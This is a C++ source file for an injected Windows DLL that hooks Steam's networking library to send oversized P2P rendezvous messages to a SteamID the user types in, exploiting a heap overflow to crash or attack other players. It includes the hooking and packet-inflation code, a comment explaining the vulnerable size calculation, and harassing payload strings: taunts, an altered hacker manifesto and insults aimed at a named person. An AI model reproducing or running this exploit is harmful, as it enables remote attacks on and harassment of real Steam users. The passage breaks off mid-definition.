// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <iostream>
#include <process.h>
#include <intrin.h>
#include "MemoryTools.h"

#include "gcsdk_gcmessages.pb.h"
#include "gcsystemmsgs.pb.h"
#include "cstrike15_gcmessages.pb.h"
// Will Need Protobuf ver 2.6.1 & to compile steam protobufs from https://github.com/SteamDatabase/Protobufs/tree/master/steam
#include "steamnetworkingsockets_messages.pb.h"

#ifdef _DEBUG
#pragma comment(lib, "lib\\Debug\\libprotobufd.lib")
#else
#pragma comment(lib, "lib\\libprotobuf.lib")
#endif

// Will Need MinHook function hooking library
// https://github.com/TsudaKageyu/minhook
#include "MinHook/MinHook.h"

// Will Need SteamWorks SDK https://partner.steamgames.com/
#include "steam/isteamuser.h"
#include "steam/isteamclient.h"
#include "steam/isteamnetworkingsockets.h"
#include "steam/isteamnetworkingutils.h"
#include "steam/isteamutils.h"
#include "steam/steamnetworkingtypes.h"
#include "steam/isteamnetworking.h"
#include "steam/isteamgamecoordinator.h"

// Globals
ISteamNetworkingSockets* g_pSteamNetworkingSockets = nullptr; 
bool g_bShouldSendCrashPacket = false;

// Function Type Declares
typedef void* (__cdecl* SteamMallocFunc_t)(int nSize);
SteamMallocFunc_t SteamMalloc = NULL;
typedef void* (__thiscall* ReliableMessageConstructorFunc_t)(void*);
ReliableMessageConstructorFunc_t ReliableMessageConstructor = 0;
typedef int(__thiscall* AddReliableMessageFunc_t)(void*, int);
AddReliableMessageFunc_t AddReliableMessage = NULL;
typedef void(__thiscall* SetRendezvousCommonFieldsAndSendSignalFunc_t)(void* _this, void* msg, __int64 usecNow, const char* pszDebugReason);
SetRendezvousCommonFieldsAndSendSignalFunc_t oSetRendezvousCommonFieldsAndSendSignal = 0;


struct message_conn_info_t
{
    uint32_t m_ConnID = 0; // from_connection_id
} g_conn;



void* FindPattern(const char* szModuleName, const char* szPattern) noexcept {
    HMODULE moduleHandle;
    if (moduleHandle = GetModuleHandleA(szModuleName)) {
        MODULEINFO moduleInfo;
        if (GetModuleInformation(GetCurrentProcess(), moduleHandle, &moduleInfo, sizeof(moduleInfo))) {
            auto start = static_cast<const char*>(moduleInfo.lpBaseOfDll);
            const auto end = start + moduleInfo.SizeOfImage;

            auto first = start;
            auto second = szPattern;

            while (first < end && *second) {
                if (*first == *second || *second == '?') {
                    ++first;
                    ++second;
                }
                else {
                    first = ++start;
                    second = szPattern;
                }
            }

            if (!*second) {
                return const_cast<char*>(start);
            }
        }
    }
}

template <typename T>
static constexpr auto relativeToAbsolute(uintptr_t address) noexcept
{
    return (T)(address + 4 + *reinterpret_cast<std::int32_t*>(address));
}




void* oCMsgSteamNetworkingP2PRendezvous_ConnectionClosed_set_debug = nullptr;
int __fastcall hk_CMsgSteamNetworkingP2PRendezvous_ConnectionClosed_set_debug(CMsgSteamNetworkingP2PRendezvous_ConnectionClosed* _this, void*, const char* a2)
{
    //return 0;
    char buffer[1];
    memset(buffer, '\n', sizeof(buffer));
    const char* lol = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nu are ratted kid!";
   // buffer[sizeof(buffer) - 1] = '\0';
    (reinterpret_cast<decltype(&hk_CMsgSteamNetworkingP2PRendezvous_ConnectionClosed_set_debug)>(oCMsgSteamNetworkingP2PRendezvous_ConnectionClosed_set_debug))(_this, 0, lol);
   
#if 1
    DWORD* std_string_obj = ((DWORD**)_this)[4];
    DWORD strSize = std_string_obj[4];


    int v5 = std_string_obj[5];
    char* buf = (char*)std_string_obj;//(char*)*std_string_obj;
    int str_size = std_string_obj[4];
    if (v5 >= 0x10)
        buf = (char*)*std_string_obj;

    for(int i = 0; i < (str_size + 1); i++)
        *(buf + i) = '\n';
#endif
    //std_string_obj[4] = INT_MAX;
    return 0;
}


/// SteamNetworkingMessages is built on top of SteamNetworkingSockets.  We use a reserved
/// virtual port for this interface
const int k_nVirtualPort_Messages = 0x7fffffff;

/// A portion of the virtual port range is carved out for "fake IP ports".
/// These are the *index* of the fake port, not the actual fake port value itself.
/// This is a much bigger reservation of the space than we ever actually expect to
/// use in practice.  Furthermore, these numbers should only be used locally.
/// Outside of the local process, we would always use the actual fake port value.
const int k_nFakePort_MaxGlobalAllocationAttempt = 255;
const int k_nVirtualPort_GlobalFakePort0 = 0x7fffff00;
const int k_nVirtualPort_GlobalFakePortMax = k_nVirtualPort_GlobalFakePort0 + k_nFakePort_MaxGlobalAllocationAttempt - 1;

const int k_nFakePort_MaxEphemeralPorts = 256;
const int k_nVirtualPort_EphemeralFakePort0 = 0x7ffffe00;
const int k_nVirtualPort_EphemeralFakePortMax = k_nVirtualPort_EphemeralFakePort0 + k_nFakePort_MaxEphemeralPorts - 1;


void* init_std_release_string()
{
    std::string* pStr = (std::string*)SteamMalloc(24);

    int* pAppMessageDataStr = (int*)pStr;
    if (pAppMessageDataStr)
    {
        *pAppMessageDataStr = 0;
        pAppMessageDataStr[4] = 0;
        pAppMessageDataStr[5] = 15;
    }

    return pStr;
}

DWORD* _CopyStringSteam(void* pBuffer, const char* szBuffer, int nSize)
{
    static DWORD* (__thiscall * CopyStringSteam)(void*, const char*, int) = (DWORD * (__thiscall*)(void*, const char*, int))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 89 75 F0") + 1));
    return CopyStringSteam(pBuffer, szBuffer, nSize);
}

void __fastcall SetRendezvousCommonFieldsAndSendSignal(void* _this, void*, void* msg, __int64 usecNow, const char* pszDebugReason)
{

    static int(__thiscall * SendConnectionClosedSignal)(int _this, __int64) =
        (int(__thiscall*)(int, __int64))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? E9 ? ? ? ? 8B 87 ? ? ? ?") + 1));

    static DWORD* (__thiscall * AddConnectionClosed)(DWORD*) = (DWORD * (__thiscall*)(DWORD*))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? EB 02 33 C0 C6 45 FC 00 89 45 C4") + 1));
    static DWORD* (__thiscall * AddApplicationMsg)(DWORD*) = (DWORD * (__thiscall*)(DWORD*))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 8B D0 89 45 E4") + 1));
    static DWORD* (__thiscall * AddApplicationMsgToRendezvous)(int*, int) = (DWORD * (__thiscall*)(int*, int))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 6A 5C") + 1));
    static DWORD* (__thiscall * CopyStringSteam)(void*, int*, int) = (DWORD * (__thiscall*)(void*, int*, int))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 89 75 F0") + 1));
    
    
    static auto add_reliable_msgs = [](CMsgSteamNetworkingP2PRendezvous* pMsg, int nWriteSize)
    {
        pMsg->set_first_reliable_msg(UINT_MAX);
        pMsg->set_ack_reliable_msg(UINT_MAX);
        //pMsg->set_from_connection_id(UINT_MAX);
        //pMsg->set_ice_enabled(false);
        //pMsg->set_to_connection_id(UINT_MAX);


        /*
        The following code is equivelent to

        while(pMsg->ByteSize() < 8192)
        {
            pMsg->add_reliable_messages();
        }

        The IDA psuedo conversion is due to steams allocator attempting to free memory not alloc'd by it,
        causing a crash. This allows us to use the Steam Malloc.

        */

        //CMsgSteamNetworkingP2PRendezvous_ReliableMessage* pClosed = pMsg->add_reliable_messages();
        int* msg_1 = (int*)pMsg;
        int* v25 = 0;
        DWORD* v26 = 0;
        void* v24 = 0;
        int v27 = 0; // edx
        int v28 = 0; // eax
        DWORD* v44 = 0; // [esp+35Ch] [ebp-38h]
        int* v45 = 0; // [esp+360h] [ebp-34h]
        int v52 = 0; // [esp+390h] [ebp-4h]
        int* v23 = msg_1 + 17;
        while (pMsg->ByteSize() < nWriteSize)
        {
            v25 = (int*)(msg_1[20]);
            if (msg_1[19] == (int)v25)
                AddReliableMessage(v23, (int)(v25 + 1));
            v26 = (DWORD*)SteamMalloc(20);
            v44 = v26;
            v52 = 0;
            if (v26)
                v24 = ReliableMessageConstructor(v26);
            else
                v24 = 0;
            v27 = msg_1[18];
            v28 = msg_1[17];
            ++msg_1[19];
            v52 = -1;
            *(DWORD*)(v28 + 4 * v27) = (DWORD)v24;
            ++msg_1[18];
        }
    };

    if (false)
    {
        //g_bShouldSendCrashPacket = false;


        CMsgSteamNetworkingP2PRendezvous* pMsg = reinterpret_cast<CMsgSteamNetworkingP2PRendezvous*>(msg);


        if (!pMsg->has_connection_closed())
        {
            
        }

        add_reliable_msgs(pMsg, 8192);

    }


    CMsgSteamNetworkingP2PRendezvous* pMsg = reinterpret_cast<CMsgSteamNetworkingP2PRendezvous*>(msg);


    int nOrigianlVPort = *(int*)((char*)_this + 14472);
    //*(DWORD*)((char*)_this + 14472) = -1;
    static bool bFlipFloop = false;

    bool bSendClose = !pMsg->has_connection_closed();

    if (!pMsg->has_connection_closed())
    {



        //SendConnectionClosedSignal((int)_this, 0);



#if 0
        DWORD* pConnClosedMem = (DWORD*)SteamMalloc(24);
        DWORD* pConnClosed = AddConnectionClosed((DWORD*)pConnClosedMem);

        ((int*)pConnClosed)[2] |= 0x400u;
        pConnClosed[2] |= 2u;
        pConnClosed[5] = *(DWORD*)((char*)_this + 13120);
        hk_CMsgSteamNetworkingP2PRendezvous_ConnectionClosed_set_debug((CMsgSteamNetworkingP2PRendezvous_ConnectionClosed*)pConnClosed, 0, "");

        ((CMsgSteamNetworkingP2PRendezvous_ConnectionClosed*)pConnClosed)->set_reason_code(9998);
        pMsg->set_allocated_connection_closed((CMsgSteamNetworkingP2PRendezvous_ConnectionClosed*)pConnClosed);
#endif
    }

    //if (!pMsg->has_connection_closed())
    //    __debugbreak();

    auto add_application_message = [&]()
    {
        char data[8192 * 2] = { 'A' };
        data[sizeof(data) - 1] = 0;

        int* pRendesvous = (int*)pMsg;
        int v51 = pRendesvous[24];
        if (pRendesvous[23] == v51)
            AddApplicationMsgToRendezvous(pRendesvous + 21, v51 + 1);

        int* pAppMessageMem = (int*)SteamMalloc(40);
        CMsgSteamNetworkingP2PRendezvous_ApplicationMessage* pAppMsg = (CMsgSteamNetworkingP2PRendezvous_ApplicationMessage*)AddApplicationMsg((DWORD*)pAppMessageMem);
        //pAppMsg->set_allocated_data(&string_data);

        std::string* pStr = (std::string*)SteamMalloc(24);

        int* pAppMessageDataStr = (int*)pStr;
        if (pAppMessageDataStr)
        {
            *pAppMessageDataStr = 0;
            pAppMessageDataStr[4] = 0;
            pAppMessageDataStr[5] = 15;
        }

        //*pStr = std::string(data);

        pAppMessageMem[2] = pAppMessageMem[2] | 1;

        CopyStringSteam(pStr, (int*)data, sizeof(data));

        pAppMessageMem[4] = (int)pStr;
        //pAppMsg->set_data(data);
        pAppMsg->set_lane_idx(0);
        pAppMsg->set_msg_num(0);

        int v53 = pRendesvous[22];
        int v54 = pRendesvous[21];
        ++pRendesvous[23];
        *(DWORD*)(v54 + 4 * v53) = (DWORD)pAppMsg;
        ++pRendesvous[22];
    };

    //add_application_message();

    if (pMsg->application_messages_size() == 0)
    {
        int fuck = 0;
    }




    int nSize = pMsg->ByteSize();

    //pMsg->add_application_messages()

    //for (int i = 0; i < 2; i++)
    {
        *(DWORD*)((char*)_this + 14472) = k_nVirtualPort_Messages;// bFlipFloop ? k_nVirtualPort_Messages : 1; // -1 : -2;// ;// ;


        bFlipFloop = !bFlipFloop;
        oSetRendezvousCommonFieldsAndSendSignal(_this, msg, usecNow, pszDebugReason); // Call Original
    }


    //if(bSendClose)
    //    SendConnectionClosedSignal((int)_this, 0);
    //    for(int i = 0; i < 50; i++)
           

    *(int*)((char*)_this + 14472) = nOrigianlVPort;
}


void* oPopulateRendezvousMsgWithTransportInfo;
void __fastcall hk_PopulateRendezvousMsgWithTransportInfo(CMsgSteamNetworkingP2PRendezvous* msg, void*, SteamNetworkingMicroseconds usecNow)
{
    reinterpret_cast<decltype(&hk_PopulateRendezvousMsgWithTransportInfo)>(oPopulateRendezvousMsgWithTransportInfo)(msg, 0, usecNow);

    msg->set_to_connection_id(0);
    msg->set_from_connection_id(0);
    msg->set_ice_enabled(true);
}
#if 1
enum _ESteamNetworkingIdentityType
{
    _k_ESteamNetworkingIdentityType_Invalid = 0,
    _k_ESteamNetworkingIdentityType_SteamID = 16, // 64-bit CSteamID
    _k_ESteamNetworkingIdentityType_IPAddress = 1,
    _k_ESteamNetworkingIdentityType_GenericString = 2,
    _k_ESteamNetworkingIdentityType_GenericBytes = 3,
    _k_ESteamNetworkingIdentityType_UnknownType = 4,
    _k_ESteamNetworkingIdentityType__Force32bit = 0x7fffffff,
};
#pragma pack(push,1)


struct _SteamNetworkingIPAddr
{
    enum { _k_cchMaxString = 48 };
    struct _IPv4MappedAddress {
        uint64 m_8zeros;
        uint16 m_0000;
        uint16 m_ffff;
        uint8 m_ip[4]; // NOTE: As bytes, i.e. network byte order
    };
    union
    {
        uint8 m_ipv6[16];
        _IPv4MappedAddress m_ipv4;
    };
    uint16 m_port; // Host byte order
};

/// An abstract way to represent the identity of a network host.  All identities can
/// be represented as simple string.  Furthermore, this string representation is actually
/// used on the wire in several places, even though it is less efficient, in order to
/// facilitate forward compatibility.  (Old client code can handle an identity type that
/// it doesn't understand.)
struct _SteamNetworkingIdentity
{
    _ESteamNetworkingIdentityType m_eType;
    enum {
        _k_cchMaxString = 128, // Max length of the buffer needed to hold any identity, formatted in string format by ToString
        _k_cchMaxGenericString = 32, // Max length of the string for generic string identities.  Including terminating '\0'
        _k_cbMaxGenericBytes = 32,
    };
    int m_cbSize;
    union {
        uint64 m_steamID64;
        char m_szGenericString[_k_cchMaxGenericString];
        uint8 m_genericBytes[_k_cbMaxGenericBytes];
        char m_szUnknownRawString[_k_cchMaxString];
        SteamNetworkingIPAddr m_ip;
        uint32 m_reserved[32]; // Pad structure to leave easy room for future expansion
    };
};
#pragma pack(pop)
#if 1
void _SteamNetworkingIdentity_ToString(_SteamNetworkingIdentity* pIdentity, char* buf, size_t cbBuf)
{
    switch (pIdentity->m_eType)
    {
    case _k_ESteamNetworkingIdentityType_Invalid:
        strncpy(buf, "invalid", cbBuf);
        break;

    case _k_ESteamNetworkingIdentityType_SteamID:
        snprintf(buf, cbBuf, "steamid:%llu", (unsigned long long)pIdentity->m_steamID64);
        break;

    case _k_ESteamNetworkingIdentityType_IPAddress:
        strncpy(buf, "ip:", cbBuf);
        __debugbreak();
        //if (cbBuf > 4)
         //   pIdentity->m_ip.ToString(buf + 3, cbBuf - 3, pIdentity->m_ip.m_port != 0);
        break;

    case _k_ESteamNetworkingIdentityType_GenericString:
        snprintf(buf, cbBuf, "str:%s", pIdentity->m_szGenericString);
        break;

    case _k_ESteamNetworkingIdentityType_GenericBytes:
        strncpy(buf, "gen:", cbBuf);
        if (cbBuf > 5)
        {
            static const char hexdigits[] = "0123456789abcdef";
            char* d = buf + 4;
            int l = min(pIdentity->m_cbSize, int(cbBuf - 5) / 2);
            for (int i = 0; i < l; ++i)
            {
                uint8 b = pIdentity->m_genericBytes[i];
                *(d++) = hexdigits[b >> 4];
                *(d++) = hexdigits[b & 0xf];
            }
            *d = '\0';
        }
        break;

    case _k_ESteamNetworkingIdentityType_UnknownType:
        strncpy(buf, pIdentity->m_szUnknownRawString, cbBuf);
        break;

    default:
        snprintf(buf, cbBuf, "bad_type:%d", pIdentity->m_eType);
    }
}
#endif
#endif


#include "framework.h"

void* oGetByteSize = nullptr;;
int __fastcall hk_GetByteSize(CMsgSteamNetworkingP2PRendezvous* msg, void*)
{
    static void* pReturnAddress = MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "8B F8 E8 ? ? ? ? 8B 13");
    static decltype(&hk_GetByteSize) pfnGetByteSize = (decltype(&hk_GetByteSize))oGetByteSize;

    if (_ReturnAddress() != pReturnAddress)
        return pfnGetByteSize(msg, 0);

   
    // last minute changes can be done here!
    //msg->set_to_connection_id(-1);
    //msg->set_from_connection_id(-1);
    //msg->set_ice_enabled(false);
    

    // set to identity
#if 1

    typedef const char* (__cdecl* anim_func_t)(void);
    static anim_func_t animfunctions[] = { dancemangifanim, rickrollrollgifanim, polegifanim, hipsgifanim, breakdancegifanim };

    static int nIteration = 0;
    static int nCurrAnimFunc = 0;


    nIteration++;

    if (nIteration >= 240)
    {
        nIteration = 0;
        nCurrAnimFunc++;
        if (nCurrAnimFunc >= ARRAYSIZE(animfunctions))
            nCurrAnimFunc = 0;
    }

    int* pRend = reinterpret_cast<int*>(msg);

    const char * manifesto[] = { "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n"
        "The following was written shortly after my arrest... \n"
        "\n"
        "                       \\/\\The Conscience of a Hacker/\\/\n"
        "\n"
        "                                      by\n"
        "\n"
        "                               +++The Mentor+++\n"
        "\n"
        "                          Written on May 26, 2022\n"
        "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n"
        "\n"
        "        Another one got caught today, it's all over the papers.  \"Teenager\n"
        "Arrested in Computer Crime Scandal\", \"Hacker Arrested after Bank Tampering\"...\n"
        "        Damn kids.  They're all alike. I'll take your steam accounts...\n"
        "\n"
        "        But did you, in your three-piece psychology and 1950's technobrain,\n"
        "ever take a look behind the eyes of the hacker?  Did you ever wonder what\n"
        "made him tick, what forces shaped him, what may have molded him?\n"
        "        I am a hacker, enter my world...\n"
        "        Mine is a world that begins with school... I'm smarter than most of\n"
        "the other kids, this crap they teach us bores me...\n"
        "        Damn underachiever.  They're all alike.\n"
        "\n"
        "        I'm in junior high or high school.  I've listened to teachers explain\n"
        "for the fifteenth time how to reduce a fraction.  I understand it.  \"No, Ms.\n"
        "Smith, I didn't show my work.  I did it in my head...\"\n"
        "        Damn kid.  Probably copied it.  They're all alike.\n"
        "\n"
        "        I made a discovery today.  I found a computer.  Wait a second, this is\n"
        "cool.  It does what I want it to.  If it makes a mistake, it's because I\n"
        "screwed it up.  Not because it doesn't like me...\n"
        "                Or feels threatened by me...\n"
        "                Or thinks I'm a smart ass...\n"
        "                Or doesn't like teaching and shouldn't be here...\n"
        "        Damn kid.  All he does is play games.  They're all alike.\n"
        "\n"
        "        And then it happened... a door opened to a world... rushing through\n"
        "the phone line like heroin through an addict's veins, an electronic pulse is\n"
        "sent out, a refuge from the day-to-day incompetencies is sought... a board is\n"
        "found.\n"
        "        \"This is it... this is where I belong...\"\n"
        "        I know everyone here... even if I've never met them, never talked to\n"
        "them, may never hear from them again... I know you all...\n"
        "        Damn kid.  Tying up the phone line again.  They're all alike...\n"
        "\n"
        "        You bet your ass we're all alike... we've been spoon-fed baby food at\n"
        "school when we hungered for steak... the bits of meat that you did let slip\n"
        "through were pre-chewed and tasteless.  We've been dominated by sadists, or\n"
        "ignored by the apathetic.  The few that had something to teach found us will-\n"
        "ing pupils, but those few are like drops of water in the desert.\n"
        "\n"
        "        This is our world now... the world of the electron and the switch, the\n"
        "beauty of the baud.  We make use of a service already existing without paying\n"
        "for what could be dirt-cheap if it wasn't run by profiteering gluttons, and\n"
        "you call us criminals.  We explore... and you call us criminals.  We seek\n"
        "after knowledge... and you call us criminals.  We exist without skin color,\n"
        "without nationality, without religious bias... and you call us criminals.\n"
        "You build atomic bombs, you wage wars, you murder, cheat, and lie to us\n"
        "and try to make us believe it's for our own good, yet we're the criminals.\n"
        "\n"
        "        Yes, I am a criminal.  My crime is that of curiosity.  My crime is\n"
        "that of judging people by what they say and think, not what they look like.\n"
        "My crime is that of outsmarting you, something that you will never forgive me\n"
        "for.\n"
        "\n"
        "        I am a hacker, and this is my manifesto.  You may stop this individual,\n"
        "but you can't stop us all... after all, we're all alike.\n"
        "\n"
        "                               +++The Mentor+++" };

    char buffer[128 * 60];
    memset(buffer, 0x00, sizeof(buffer));
    memset(buffer, '\n', 70);
    static auto GetAnimation = [](char buffer[], int nBufSize )
    {
        const int nRows = 70;
        static bool bFlipFlop = false;
        const int nColumns = 150;
        static int nRotation = 0;
        const char* szText = " Fuck Fl0m ";
        int nOffset = nRows;
        buffer[0] = '\n';

        bFlipFlop ? nRotation++ : nRotation--;
        
        //if (nRotation >= nColumns || nRotation < 0)
        //{
        //    bFlipFlop = !bFlipFlop;
        //    bFlipFlop ? nRotation++ : nRotation--;
        //}

         const int nTextSize = strlen(szText);
         //int nMiddlePoint = (nColumns - nRotation) / 2;
         int nTextStartPoint = (nColumns - nRotation) - nTextSize + 1;


         if (nTextStartPoint < 0 || nTextStartPoint > (nColumns - nTextSize))
         {
             bFlipFlop = !bFlipFlop;
             bFlipFlop ? nRotation++ : nRotation--;
             bFlipFlop ? nRotation++ : nRotation--;
             nTextStartPoint = (nColumns - nRotation) - nTextSize + 1;
         }


         for (int i = 0; i < nTextStartPoint; i++)
             buffer[i + nOffset] = i % 2 ? '=' : '-';

         memcpy(buffer + nOffset + nTextStartPoint, szText, nTextSize);

         for (int i = nTextStartPoint + nTextSize; i < nColumns; i++)
             buffer[i + nOffset] = i % 2 ? '=' : '-';

         //buffer[nOffset] = '\n';
        


    };

    GetAnimation(buffer, sizeof(buffer));

    //memset(buffer, 'A', sizeof(buffer));
    buffer[sizeof(buffer) - 1] = 0;
    const char szStr[] = "ip:0.0.0.0" ;
    void* str = init_std_release_string();
#if 1
    const char* szAnim = animfunctions[nCurrAnimFunc]();//rickrollrollgifanim();// dancemangifanim();//dancemangifanim();
    int nstrlen = strlen(szAnim);
    if (GetAsyncKeyState(VK_LMENU))
    {
        const char* rick_roll = rickrollrollgifanim();
        _CopyStringSteam(str, rick_roll, strlen(rick_roll));
    }
    else
        _CopyStringSteam(str, szAnim, strlen(szAnim));
        



    pRend[4] = (int)str;
#endif
    
    //static int nVirtualPort = 0;
    //msg->connect_request().set

    
#if 1
    memset(buffer, '\r\u001b\n', sizeof(buffer));
    //const char* szShit = "\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b\u001b[31mstr:getriggityfuckfucked";
    _CopyStringSteam(str, buffer, sizeof(buffer));
    DWORD* std_string_obj = ((DWORD**)pRend)[4];
    DWORD strSize = std_string_obj[4];


    int v5 = std_string_obj[5];
    char* buf = (char*)std_string_obj;//(char*)*std_string_obj;
    int str_size = std_string_obj[4];
    if (v5 >= 0x10)
        buf = (char*)*std_string_obj;

    buf[str_size] = '\r';
    buf[str_size - 1] = '\r';
    buf[str_size + 1] = '\r';
    //for (int i = 0; i < (str_size + 1); i++)
    //    *(buf + i) = 'A';
    pRend[4] = (int)str;
#endif
#endif

    

    if (g_conn.m_ConnID != 0)
        msg->set_from_connection_id(g_conn.m_ConnID);

    auto ret = pfnGetByteSize(msg, 0);
    return ret;
}


ISteamNetworkingUtils* pUtils = nullptr;
void SendCrashMessage(std::uint32_t ID)
{
    //
    CSteamID csID(ID, k_EUniversePublic, k_EAccountTypeIndividual);
    static SteamNetworkingIdentity Iden;
    Iden.SetSteamID(csID);

    // Send Oversized packet in connection request, causing heap overflow
    g_bShouldSendCrashPacket = true;
    //k_nSteamNetworkingConfig_P2P_Transport_ICE_Enable_All
    // k_ESteamNetworkingConfig_P2P_Transport_ICE_Enable
    // k_ESteamNetworkingConfig_P2P_Transport_ICE_Penalty
    // k_ESteamNetworkingConfig_P2P_Transport_SDR_Penalty
    // k_ESteamNetworkingConfig_P2P_Transport_SDR_Penalty
    //for (int i = 0; i < 1000; i++)
    while(true)
    {
        
        //auto hConn = g_pSteamNetworkingSockets->ConnectP2P(Iden, 0, 0, 0);
        pUtils->SetGlobalConfigValueInt32(k_ESteamNetworkingConfig_TimeoutInitial, INT_MAX);
        pUtils->SetGlobalConfigValueInt32(k_ESteamNetworkingConfig_TimeoutConnected, INT_MAX);
        pUtils->SetGlobalConfigValueInt32(k_ESteamNetworkingConfig_SDRClient_ConsecutitivePingTimeoutsFailInitial, INT_MAX);
        pUtils->SetGlobalConfigValueInt32(k_ESteamNetworkingConfig_SDRClient_ConsecutitivePingTimeoutsFail, INT_MAX);
        pUtils->SetGlobalConfigValueInt32(k_ESteamNetworkingConfig_P2P_Transport_ICE_Enable, k_nSteamNetworkingConfig_P2P_Transport_ICE_Enable_All);
        pUtils->SetGlobalConfigValueInt32(k_ESteamNetworkingConfig_P2P_Transport_ICE_Penalty, 0);
        pUtils->SetGlobalConfigValueInt32(k_ESteamNetworkingConfig_P2P_Transport_SDR_Penalty, 9999);

        auto hConn = g_pSteamNetworkingSockets->ConnectP2P(Iden, 0, 0, 0);
        pUtils->SetConnectionConfigValueInt32(hConn, k_ESteamNetworkingConfig_P2P_Transport_ICE_Enable, k_ESteamNetworkingConfig_P2P_Transport_ICE_Enable);
        
        Sleep(600);
        //char buffer[8192];
        //memset(buffer, '\n', sizeof(buffer));

        if (GetAsyncKeyState(VK_NUMLOCK))
            break;
        //break;

        //auto sendRes = g_pSteamNetworkingSockets->SendMessageToConnection(hConn, buffer, sizeof(buffer), k_nSteamNetworkingSend_NoNagle, 0);
       // g_pSteamNetworkingSockets->CloseConnection(hConn, 0, "killing after 9000 ms", true);
    }
    
    
    
    printf("Crashing User With SteamID3 %d\n", csID.GetAccountID());
    char buffer[8192];
    memset(buffer, '\n', sizeof(buffer));
   // for (int i = 0; i < 100000; i++)
    //{
    //    auto sendRes = g_pSteamNetworkingSockets->SendMessageToConnection(hConn, buffer, sizeof(buffer), k_nSteamNetworkingSend_NoNagle, 0);
   //     //if (k_EResultOK != sendRes)
   //     //    __debugbreak();
   // }

    //buffer[sizeof(buffer) - 1] = '\0';
    //Sleep(3000);

    //g_pSteamNetworkingSockets->CloseConnection(hConn, 0, "killing after 9000 ms", true);
}

unsigned int WINAPI MainThread(void*)
{
    g_pSteamNetworkingSockets->CreateFakeUDPPort(0);
    g_pSteamNetworkingSockets->CreateListenSocketP2P(0, 0, 0);
    while (true)
    {

        //Sleep(9000);

        int(__cdecl * oAssert)(const char* a1, int a2, const char*);
        oAssert = (decltype(oAssert))MemoryTools::RelativeToAbsolute((void**)((char*)MemoryTools::PatternScanModule("steamnetworkingsockets.dll", "E8 ? ? ? ? 0F B7 0E") + 1));

        oAssert(
            "c:\\buildslave\\sdr_public_win32\\build\\src\\steamnetworkingsockets\\clientlib\\steamnetworkingsockets_p2p.cpp",
            3218,
            "Assertion Failed: n >= 32");


        printf("Please Provide Target SteamID : ");

        std::uint32_t ID;
        std::cin >> ID;
        SendCrashMessage(ID);




    }
}


/*


CMsgClientP2PConnectionInfo ConnectionInfo;
CMsgSteamNetworkingP2PRendezvous RendezvousMessage;
if(RendezvousMessage.ParsePartialFromString(ConnectionInfo.rendezvous))
{

    int nByteSize = RendezvousMessage.ByteSize();
    int nSizeToAllocate = 8208;
    if(nByteSize > 8192)
        nSizeToAllocate = 16400 - nByteSize; // <-- bug occurs here
    void* pAllocatedMemory = g_pMemAlloc->Alloc(nSizeToAllocate);
    // ~ Write Header Info ~ 
    RendezvousMessage.SerializeWithCachedSizesToArray(pAllocatedMemory + 16); // Overrwrite Occurs here
    
}



*/

void* pOCMsgSteamDatagramConnectionClosed_Con_1 = nullptr;
DWORD* __fastcall hk_CMsgSteamDatagramConnectionClosed_Con_1(DWORD* _this)
{
    __debugbreak();
    return nullptr;
}

void* pOCMsgSteamDatagramConnectionClosed_Con_2 = nullptr;
int __fastcall hk_CMsgSteamDatagramConnectionClosed_Con_2(DWORD* _this)
{
    __debugbreak();
    return 0;
}

void* pOCMsgSteamDatagramConnectionClosed_Con_3 = nullptr;
DWORD* __fastcall hk_CMsgSteamDatagramConnectionClosed_Con_3(DWORD* _this, void*, bool a2)
{
    __debugbreak();
    return nullptr;
}



class SteamNetworkingDetailedConnectionStatus;
class CSteamNetworkConnectionBase;
void* oAPIGetDetailedConnectionStatus = nullptr;
void __fastcall hk_APIGetDetailedConnectionStatus(CSteamNetworkConnectionBase* _this, void*, SteamNetworkingDetailedConnectionStatus* stats, SteamNetworkingMicroseconds usecNow)
{
    
    void* m_pTransport = *(void**)((char*)_this + 36);

    if (!m_pTransport)
        return (reinterpret_cast<decltype(&hk_APIGetDetailedConnectionStatus)>(oAPIGetDetailedConnectionStatus))(_this, 0, stats, usecNow);

    //int nVtableCount = MemoryTools::CalculateVmtLength(m_pTransport);
    //std::string pStrings[1024];

    //MemoryTools::CreateVTableSigsx86(m_pTransport, nVtableCount, pStrings);

    //for (int i = 0; i < nVtableCount; i++)
    //    printf("%s\n", pStrings[i].c_str());

    (reinterpret_cast<decltype(&hk_APIGetDetailedConnectionStatus)>(oAPIGetDetailedConnectionStatus))(_this, 0, stats, usecNow);
}

void output_steam_debug(ESteamNetworkingSocketsDebugOutputType nType, const char* pszMsg)
{
    printf("%s\n", pszMsg);
}

struct stdstring_release
{
private:
    unsigned long ptr; //0x0
    unsigned* pad[3]; //0x4
    unsigned int m_size; //0x10  
    unsigned int m_res; //0x14

    const char* get_large_string() { return reinterpret_cast<const char*>(ptr); }
    bool large_string_engaged() { return m_res >= 16; }

public:

    unsigned int size() const { return m_size; }
